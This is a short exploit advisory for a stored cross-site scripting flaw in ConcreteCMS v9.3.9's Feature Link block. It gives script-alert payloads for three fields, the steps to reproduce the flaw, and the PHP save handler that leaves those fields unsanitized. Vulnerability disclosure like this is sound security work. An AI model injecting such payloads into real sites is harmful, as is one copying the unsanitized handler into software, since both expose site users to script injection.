# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/13/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Title field、Body Source field、Button Text field when adding a Feature Link block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('Title');</script>
<script>alert('Body Source');</script>
<script>alert('Button Text');</script>
```

1. Log in as a user with page editing privileges.
2. Click "add content to the page" in the top navigation.
3. Select the Feature Link block , drag and drop it to the page.
4. Add <script>alert('...');</script> to the Title field、Body Source field、Button Text field and then click ADD,the xss vulnerability appears.

Potentially problematic source code:
```php

public function save($args)
    {
        list($imageLinkType, $imageLinkValue) = $this->app->make(DestinationPicker::class)->decode('imageLink', $this->getImageLinkPickers(), null, null, $args);

        $args['buttonInternalLinkCID'] = $imageLinkType === 'page' ? $imageLinkValue : 0;
        $args['buttonFileLinkID'] = $imageLinkType === 'file' ? $imageLinkValue : 0;
        $args['buttonExternalLink'] = $imageLinkType === 'external_url' ? $imageLinkValue : '';
        $security = $this->app->make('helper/security');
        $args['icon'] = $security->sanitizeString($args['icon'] ?? '');
        $args = $args + [
            'fID' => 0,
        ];
        $args['fID'] = $args['fID'] != '' ? $args['fID'] : 0;

        parent::save($args);
    }
```